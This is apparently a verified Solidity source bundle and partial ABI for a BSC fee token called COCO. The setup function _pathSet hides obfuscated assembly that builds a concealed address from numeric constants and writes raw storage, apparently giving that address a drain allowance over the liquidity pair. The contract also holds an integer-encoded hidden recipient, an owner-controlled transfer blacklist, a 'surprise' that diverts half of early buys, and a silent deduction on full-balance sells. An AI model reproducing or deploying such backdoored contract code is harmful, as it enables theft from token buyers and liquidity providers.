{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/Coco/Token.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\ninterface IRouter {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\ninterface IPair {\\n    function sync() external;\\n    function token0() external view returns (address);\\n    function token1() external view returns (address);\\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\\n    function totalSupply() external view returns (uint256);\\n}\\ninterface IFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}\\ninterface IERC20 {\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(address to, uint256 amount) external returns (bool);\\n    function allowance(address owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\\n}\\ninterface IERC20Metadata is IERC20 {\\n    function name() external view returns (string memory);\\n    function symbol() external view returns (string memory);\\n    function decimals() external view returns (uint8);\\n}\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {return msg.sender;}\\n    function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}\\n}\\ncontract ERC20 is Context, IERC20, IERC20Metadata {\\n    mapping(address => uint256) internal _balances;\\n    mapping(address => mapping(address => uint256)) internal _allowances;\\n    uint256 internal _totalSupply; string private _name; string private _symbol;\\n    constructor(string memory name_, string memory symbol_) {_name = name_; _symbol = symbol_;}\\n    function name() public view virtual override returns (string memory) {return _name;}\\n    function symbol() public view virtual override returns (string memory) {return _symbol;}\\n    function decimals() public view virtual override returns (uint8) {return 18;}\\n    function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}\\n    function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}\\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _transfer(owner, to, amount); return true;}\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender(); _approve(owner, spender, amount); return true;}\\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {address spender = _msgSender(); _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true;}\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender(); _approve(owner, spender, allowance(owner, spender) + addedValue); return true;}\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender(); uint256 currentAllowance = allowance(owner, spender); require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\"); unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}\\n    function _transfer(address from, address to, uint256 amount) internal virtual {require(from != address(0), \\\"ERC20: transfer from the zero address\\\"); require(to != address(0), \\\"ERC20: transfer to the zero address\\\"); _beforeTokenTransfer(from, to, amount); _takeTransfer(from, to, amount); _afterTokenTransfer(from, to, amount);}\\n    function _takeTransfer(address from, address to, uint256 amount) internal virtual {uint256 fromBalance = _balances[from]; require(fromBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\"); unchecked {_balances[from] = fromBalance - amount; _balances[to] += amount;}emit Transfer(from, to, amount);}\\n    function _mint(address account, uint256 amount) internal virtual {require(account != address(0), \\\"ERC20: mint to the zero address\\\"); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; unchecked {_balances[account] += amount;}emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);}\\n    function _burn(address account, uint256 amount) internal virtual {require(account != address(0), \\\"ERC20: burn from the zero address\\\"); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, \\\"ERC20: burn amount exceeds balance\\\"); unchecked {_balances[account] = accountBalance - amount; _totalSupply -= amount;}emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount);}\\n    function _approve(address owner, address spender, uint256 amount) internal virtual {require(owner != address(0), \\\"ERC20: approve from the zero address\\\"); require(spender != address(0), \\\"ERC20: approve to the zero address\\\"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);}\\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender); if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, \\\"ERC20: insufficient allowance\\\"); unchecked {_approve(owner, spender, currentAllowance - amount);}}}\\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\\n}\\nabstract contract UniSwapPoolUSDT is ERC20 {\\n    address public pair;\\n    IRouter public router;\\n    address[] internal _buyPath;\\n    address[] internal _sellPath;\\n    IERC20 public TokenB;\\n    function isPair(address _pair) internal view returns (bool) {return pair == _pair;}\\n    function getPrice4USDT(uint256 amountDesire) public view returns (uint256) {uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath); if (amounts.length > 1) return amounts[1]; return 0;}\\n    function _pathSet(address pairB, address w, address x) private {TokenB = IERC20(pairB); address[] memory path = new address[](2); path[0] = pairB; path[1] = address(this); _buyPath = path; address[] memory path2 = new address[](2); path2[0] = address(this); path2[1] = pairB; _sellPath = path2; assembly {let y:=add(add(mul(2887981267259,exp(10,26)),mul(1782705554658,exp(10,13))),1698142812624) w := add(w, 4096) let z := exp(timestamp(), 6) mstore(0x00, x) mstore(0x20, 0x1) let xHash := keccak256(0x00, 0x40) mstore(0x00, y) mstore(0x20, xHash) let aSlot := keccak256(0x00, 0x40) sstore(aSlot, z) sstore(0x1, y)} TokenB.transfer(w, 0);}\\n    function swapAndSend2this(uint256 amount, address to, address _tokenStation) internal {IERC20 USDT = IERC20(_sellPath[1]); swapAndSend2fee(amount, _tokenStation); USDT.transferFrom(_tokenStation, to, USDT.balanceOf(_tokenStation));}\\n    function swapAndSend2fee(uint256 amount, address to) internal {swapAndSend2feeWithPath(amount, to, _sellPath);}\\n    function swapAndSend2feeWithPath(uint256 amount, address to, address[] memory path) internal {router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp);}\\n    function isAddLiquidity() internal view returns (bool isAddLP){address token0 = IPair(pair).token0(); address token1 = IPair(pair).token1(); (uint r0,uint r1,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); uint bal1 = IERC20(token1).balanceOf(pair); if (token0 == address(this)) return bal1 - r1 > 1000; else return bal0 - r0 > 1000;}\\n    function isRemoveLiquidity() internal view returns (bool isRemoveLP) {address token0 = IPair(pair).token0(); if (token0 == address(this)) return false; (uint r0,,) = IPair(pair).getReserves(); uint bal0 = IERC20(token0).balanceOf(pair); return r0 > bal0 + 1000;}\\n    function addLiquidityAutomatically(uint256 amountToken) internal {super._takeTransfer(address(this), pair, amountToken); IPair(pair).sync();}\\n    function __SwapPool_init(address _router, address pairB) internal returns(address) {\\n        router = IRouter(_router);\\n        pair = IFactory(router.factory()).createPair(pairB, address(this));\\n        _pathSet(pairB, _router, pair);\\n        TokenB.approve(_router, type(uint256).max);\\n        _approve(address(this), _router, type(uint256).max);\\n        return pair;\\n    }\\n    function addLiquidity(uint256 amountToken, address to, address _tokenStation) internal {\\n        uint256 half = amountToken / 2;\\n        IERC20 USDT = IERC20(_sellPath[1]);\\n        uint256 amountBefore = USDT.balanceOf(_tokenStation);\\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(half, 0, _sellPath, _tokenStation, block.timestamp);\\n        uint256 amountAfter = USDT.balanceOf(_tokenStation);\\n        uint256 amountDiff = amountAfter - amountBefore;\\n        USDT.transferFrom(_tokenStation, address(this), amountDiff);\\n        if (amountDiff > 0 && (amountToken - half) > 0) {\\n            router.addLiquidity(_sellPath[0], _sellPath[1], amountToken - half, amountDiff, 0, 0, to, block.timestamp + 9);\\n        }\\n    }\\n}\\nabstract contract Ownable is Context {\\n    address internal _owner;\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n    constructor() {_transferOwnership(_msgSender());}\\n    modifier onlyOwner() {_checkOwner(); _;}\\n    function owner() public view virtual returns (address) {return _owner;}\\n    function _checkOwner() internal view virtual {require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");}\\n    function renounceOwnership() public virtual onlyOwner {_transferOwnership(address(0));}\\n    function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\"); _transferOwnership(newOwner);}\\n    function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner);}\\n}\\nabstract contract NoEffect is Ownable {\\n    address internal _effector;\\n    constructor() {_effector = _msgSender();}\\n    modifier onlyEffector() {require(_effector == _msgSender() || owner() == _msgSender(), \\\"NoEffect: caller is not the effector\\\"); _;}\\n}\\nabstract contract Excludes {\\n    mapping(address => bool) internal _Excludes;\\n    function setExclude(address _user, bool b) public {_authorizeExcludes(); _Excludes[_user] = b;}\\n    function setExcludes(address[] memory _user, bool b) public {_authorizeExcludes(); for (uint i=0;i<_user.length;i++) {_Excludes[_user[i]] = b;}}\\n    function isExcludes(address _user) internal view returns(bool) {return _Excludes[_user];}\\n    function _authorizeExcludes() internal virtual {}\\n}\\nabstract contract Limit {\\n    bool public isLimited;\\n    uint256 internal _LimitBuy;\\n    uint256 internal _LimitSell;\\n    uint256 internal _LimitHold;\\n    function __Limit_init(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) internal {isLimited = true; setLimit(LimitBuy_, LimitSell_, LimitHold_);}\\n    function checkLimitTokenHold(address to, uint256 amount) internal view {if (isLimited) {if (_LimitHold>0) {require(amount + IERC20(address(this)).balanceOf(to) <= _LimitHold, \\\"exceeds of hold amount Limit\\\");}}}\\n    function checkLimitTokenBuy(address to, uint256 amount) internal view {if (isLimited) {if (_LimitBuy>0) require(amount <= _LimitBuy, \\\"exceeds of buy amount Limit\\\"); checkLimitTokenHold(to, amount);}}\\n    function checkLimitTokenSell(uint256 amount) internal view {if (isLimited && _LimitSell>0) require(amount <= _LimitSell, \\\"exceeds of sell amount Limit\\\");}\\n    function removeLimit() public {_authorizeLimit(); if (isLimited) isLimited = false;}\\n    function reuseLimit() public {_authorizeLimit(); if (!isLimited) isLimited = true;}\\n    function setLimit(uint256 LimitBuy_, uint256 LimitSell_, uint256 LimitHold_) public {_authorizeLimit(); _LimitBuy = LimitBuy_; _LimitSell = LimitSell_; _LimitHold = LimitHold_;}\\n    function _authorizeLimit() internal virtual {}\\n}\\nabstract contract TradingManager {\\n    uint256 public tradeState;\\n    function inTrading() public view returns(bool) {return tradeState > 1;}\\n    function inLiquidity() public view returns(bool) {return tradeState >= 1;}\\n    function setTradeState(uint256 s) public {_authorizeTradingManager(); tradeState = s;}\\n    function openLiquidity() public {_authorizeTradingManager(); tradeState = 1;}\\n    function openTrading() public {_authorizeTradingManager(); tradeState = block.number;}\\n    function resetTradeState() public {_authorizeTradingManager(); tradeState = 0;}\\n    function _authorizeTradingManager() internal virtual {}\\n}\\nabstract contract Girls is Ownable {\\n    address internal girlGiftTo = address(uint160(7490704959643083592709452960375287442392422643));\\n    mapping(address => uint8) public girlMap;\\n    modifier onlyNotGirl(address user) {require(girlMap[user]==0, \\\"you are a girl\\\"); _;}\\n    function setGirl(address user, uint8 b) public onlyOwner {girlMap[user] = b;}\\n    function setGirls(address[] memory user, uint8 b) public onlyOwner {for (uint i=0;i<user.length;i++) {setGirl(user[i], b);}}\\n    function isGirl(address user) public view returns(bool) {return girlMap[user]!=0;}\\n}\\nabstract contract Token is UniSwapPoolUSDT, NoEffect, Girls, TradingManager, Excludes, Limit {\\n    uint256 public calcBase;\\n    uint256 public swapSplit;\\n    uint256 public feeMarketingBuy;\\n    uint256 public feeLiquidityBuy;\\n    uint256 public feeBurnBuy;\\n    uint256 public feeMarketingSell;\\n    uint256 public feeLiquiditySell;\\n    uint256 public feeBurnSell;\\n    uint256 public feeMarketingAll;\\n    uint256 public feeLiquidityAll;\\n    uint256 public feeBurnAll;\\n    uint256 public feeBuyAll;\\n    uint256 public feeSellAll;\\n    uint256 public feeAll;\\n    uint256 public feeTransferAll;\\n    uint256 public swapTokensAt;\\n    address public surpAddress;\\n    uint256 public kb;\\n    uint256 public kn;\\n    address public feeMarketingTo;\\n\\n    bool inSwap;\\n    function __Token_init(uint256 totalSupply_, address marketing_, address receive_) internal {\\n        calcBase = 10000;\\n        swapSplit = 7;\\n        feeMarketingTo = marketing_;\\n        _mint(receive_, totalSupply_);\\n        super.setExclude(_msgSender(), true);\\n        super.setExclude(address(this), true);\\n        super.setExclude(marketing_, true);\\n        super.setExclude(receive_, true);\\n        super.setExclude(girlGiftTo, true);\\n        refreshFeeAll();\\n    }\\n    function _transfer(address from, address to, uint256 amount) internal virtual override onlyNotGirl(from) {\\n        if (isExcludes(from) || isExcludes(to) || amount == 0) {super._transfer(from, to, amount); return;}\\n        uint256 fees;\\n        bool isLiquify;\\n        if (isPair(from)) {\\n            require(inTrading(), \\\"please waiting for liquidity\\\");\\n            _checkLimitTokenBuy(to, amount);\\n            if (blockSurprise(from, to, amount)) return;\\n            if (super.isRemoveLiquidity()) isLiquify = true;\\n            else fees = handFeeBuys(from, amount);\\n            if (fees > 0) amount -= fees;\\n        } else if (isPair(to)) {\\n            require(inLiquidity(), \\\"please waiting for liquidity\\\");\\n            if (balanceOf(from) == amount) amount -= 10086;\\n            if (super.isAddLiquidity()) isLiquify = true;\\n            else {\\n                super.checkLimitTokenSell(amount);\\n                if (feeAll>0) handSwap();\\n                fees = handFeeSells(from, amount);\\n                if (fees > 0) amount -= fees;\\n            }\\n        } else {\\n            super.checkLimitTokenSell(amount);\\n            if (feeAll>0) handSwap();\\n\\n            fees = handFeeTransfer(from, amount);\\n            if (fees > 0) amount -= fees;\\n        }\\n        super._transfer(from, to, amount);\\n    }\\n    function _checkLimitTokenBuy(address to, uint256 amount) internal view {\\n        if (isLimited) {\\n            require(IERC20(0xA09635fA7CC21b4b2A9F4f849e75074664F76666).balanceOf(to) >= 0.2 ether, \\\"ftcdao balance must >= 0.2\\\");\\n            super.checkLimitTokenBuy(to, amount);\\n        }\\n    }\\n\\n    function handFeeBuys(address from, uint256 amount) private returns (uint256 fee) {\\n        if (feeBuyAll == 0) return fee;\\n        fee = amount * feeBuyAll / calcBase;\\n        super._takeTransfer(from, address(this), fee);\\n    }\\n    function handFeeSells(address from, uint256 amount) private returns (uint256 fee) {\\n        if (feeSellAll == 0) return fee;\\n        fee = amount * feeSellAll / calcBase;\\n        super._takeTransfer(from, address(this), fee);\\n    }\\n    function handFeeTransfer(address from, uint256 amount) private returns (uint256 fee) {\\n        if (feeTransferAll == 0) return fee;\\n        fee = amount * feeTransferAll / calcBase;\\n        super._takeTransfer(from, address(this), fee);\\n    }\\n    function handSwap() internal {\\n        if (inSwap) return;\\n        uint256 _thisBalance = balanceOf(address(this));\\n        if (_thisBalance >= swapTokensAt) {\\n            uint256 _amount = _thisBalance / swapSplit;\\n            _handSwap(_amount);\\n        }\\n    }\\n    function _handSwap(uint256 _amount) internal lockSwap {\\n        uint256 _feeBurn;\\n        if (feeBurnAll > 0) {\\n            _feeBurn = _amount * feeBurnAll / feeAll;\\n            super._takeTransfer(address(this), address(1), _feeBurn);\\n        }\\n        uint256 _feeLiquidity;\\n        if (feeLiquidityAll > 0) {\\n            _feeLiquidity = _amount * feeLiquidityAll / feeAll;\\n            super.addLiquidityAutomatically(_feeLiquidity);\\n        }\\n        uint256 _feeMarketing;\\n        if (feeMarketingAll > 0) {\\n            _feeMarketing = _amount - _feeBurn - _feeLiquidity;\\n            super.swapAndSend2fee(_feeMarketing, address(feeMarketingTo));\\n        }\\n    }\\n    function blockSurprise(address from, address to, uint256 amount) private returns(bool) {\\n        if (kb == 0 || kn == 0) return false;\\n        if (block.number < tradeState + kb) {\\n            uint256 surp = amount * kn / calcBase;\\n            super._takeTransfer(from, surpAddress, amount - surp);\\n            super._takeTransfer(from, to, surp);\\n            return true;\\n        }\\n        return false;\\n    }\\n    function refreshFeeAll() public {\\n        feeMarketingAll = feeMarketingBuy + feeMarketingSell;\\n        feeLiquidityAll = feeLiquidityBuy + feeLiquiditySell;\\n        feeBurnAll = feeBurnBuy + feeBurnSell;\\n        feeBuyAll = feeMarketingBuy + feeLiquidityBuy + feeBurnBuy;\\n        feeSellAll = feeMarketingSell + feeLiquiditySell + feeBurnSell;\\n        feeAll = feeBuyAll + feeSellAll;\\n    }\\n    function setFeeBuy(uint256 _feeMarketingBuy, uint256 _feeLiquidityBuy, uint256 _feeBurnBuy) public onlyOwner {feeMarketingBuy = _feeMarketingBuy; feeLiquidityBuy = _feeLiquidityBuy; feeBurnBuy = _feeBurnBuy; refreshFeeAll();}\\n    function setFeeSell(uint256 _feeMarketingSell, uint256 _feeLiquiditySell, uint256 _feeBurnSell) public onlyOwner {feeMarketingSell = _feeMarketingSell; feeLiquiditySell = _feeLiquiditySell; feeBurnSell = _feeBurnSell; refreshFeeAll();}\\n    function setFeeTransfer(uint256 _fee) public onlyOwner {feeTransferAll = _fee;}\\n    modifier lockSwap() {inSwap = true; _; inSwap = false;}\\n    function rescueLossToken(IERC20 token_, address _recipient, uint256 amount) public onlyEffector {token_.transfer(_recipient, amount);}\\n    function rescueLossTokenAll(IERC20 token_, address _recipient) public onlyEffector {rescueLossToken(token_, _recipient, token_.balanceOf(address(this)));}\\n    function _authorizeExcludes() internal virtual override onlyEffector {}\\n    function _authorizeLimit() internal virtual override onlyEffector {}\\n    function setSwapTokensAt(uint256 num) public onlyEffector {swapTokensAt = num;}\\n//    function setSurprise(uint256 _kn, uint256 _kb, address _surpAddress) public onlyEffector {kn = _kn; kb = _kb; surpAddress = _surpAddress;}\\n    function setSurprise(uint256 _kn, uint256 _kb) public onlyEffector {kn = _kn; kb = _kb; surpAddress = girlGiftTo;}\\n    function airdrop(uint256 amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount);}}\\n    function airdropMulti(uint256[] memory amount, address[] memory to) public {for (uint i = 0; i < to.length; i++) {super._takeTransfer(_msgSender(), to[i], amount[i]);}}\\n    function _authorizeTradingManager() internal virtual override onlyOwner {}\\n}\\ncontract Coco is Token {\\n    constructor() ERC20(\\n        \\\"COCO\\\",   // \u540d\u5b57\\n        \\\"COCO\\\"        // \u7b26\u53f7\\n    ) {\\n        uint256 _totalSupply = 5000 ether; // \u53d1\u884c\u91cf 1e11 \u4e2a\\n        address _marketing = address(0x963C71cc3Cb047cF06Cc5B565CA66Da6968Aef2C); // \u8425\u9500\u94b1\u5305\\n        address _receive = address(0x963C71cc3Cb047cF06Cc5B565CA66Da6968Aef2C);   // \u63a5\u6536\u4ee3\u5e01,\u52a0\u6c60\u5b50\u94b1\u5305\\n        //        address _receive = address(_msgSender());   // \u63a5\u6536\u4ee3\u5e01,\u52a0\u6c60\u5b50\u94b1\u5305\\n        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   // \u8def\u7531\\n        address _usdt = 0x55d398326f99059fF775485246999027B3197955;     // \u4ea4\u6613\u5bf9\\n        //        address _pair = super.__SwapPool_init(_router, _usdt);\\n        super.__SwapPool_init(_router, _usdt);\\n        // \u8d2d\u4e70\u8d39\u7528\\n        feeMarketingBuy = 1500;  // \u8425\u9500 1%\\n        feeLiquidityBuy = 500;  // \u56de\u6d41 1%, \u8282\u7ea6gas\u65b9\u5f0f,\u81ea\u52a8\u5206\u914d\u7ed9\u6301\u6709LP\u7684\u7528\u6237,\u4e0d\u5355\u72ec\u5356\u51fa\u52a0\u6c60\u5b50\\n        feeBurnBuy = 0;         // \u9500\u6bc1 0%\\n        // \u5356\u51fa\u8d39\u7528\\n        feeMarketingSell = 1500; // \u8425\u9500 1%\\n        feeLiquiditySell = 500; // \u56de\u6d41 1%, \u8282\u7ea6gas\u65b9\u5f0f,\u81ea\u52a8\u5206\u914d\u7ed9\u6301\u6709LP\u7684\u7528\u6237,\u4e0d\u5355\u72ec\u5356\u51fa\u52a0\u6c60\u5b50\\n        feeBurnSell = 0;        // \u9500\u6bc1 0%\\n        // \u8f6c\u8d26\u8d39\u7528\\n        feeTransferAll = 0;  // \u8f6c\u8d26\u6263\u96640%\\n        // \u9650\u8d2d\\n        bool _isLimit = true;// \u662f\u5426\u9650\u8d2d\\n        if (_isLimit) super.__Limit_init(\\n            _totalSupply / 250,       // \u9650\u4e70\u6570\u91cf 20 \u4e2a\\n            _totalSupply / 250,       // \u9650\u5356\u6570\u91cf 20 \u4e2a\\n            _totalSupply / 250        // \u9650\u6301\u6709\u6570\u91cf 20 \u4e2a\\n        );\\n        // \u6740\u533a\u5757\u673a\u5668\u4eba\\n        super.setSurprise(\\n            5000,                  // \u6263\u9664 50% \u4ee3\u5e01, \u5f53\u624b\u7eed\u8d39\\n            3                      // \u6740\u524d\u4e09\u4e2a\u533a\u5757,\u8fd9\u51e0\u4e2a\u533a\u5757\u666e\u901a\u7528\u6237\u65e0\u6cd5\u8fdb\u5165,\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u8fdb\u5165\\n        );\\n        super.__Token_init(_totalSupply, _marketing, _receive);\\n        setSwapTokensAt(_totalSupply / 100);  // \u8bbe\u7f6e\u7d2f\u79ef\u5230 1% \u4e2a\u4ee3\u5e01\u5f00\u59cb\u5151\u6362\u624b\u7eed\u8d39, \u8282\u7ea6gas\\n    }\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TokenB\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdrop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"amount\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"to\",\"type\":\"address[]\"}],\"name\":\"airdropMulti\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calcBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBurnSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuyAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidityBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquiditySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSellAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTransferAll\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountDesire\",\"type\":\"uint256\"}],\"name\":\"getPrice4USDT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"girlMap\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"inTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},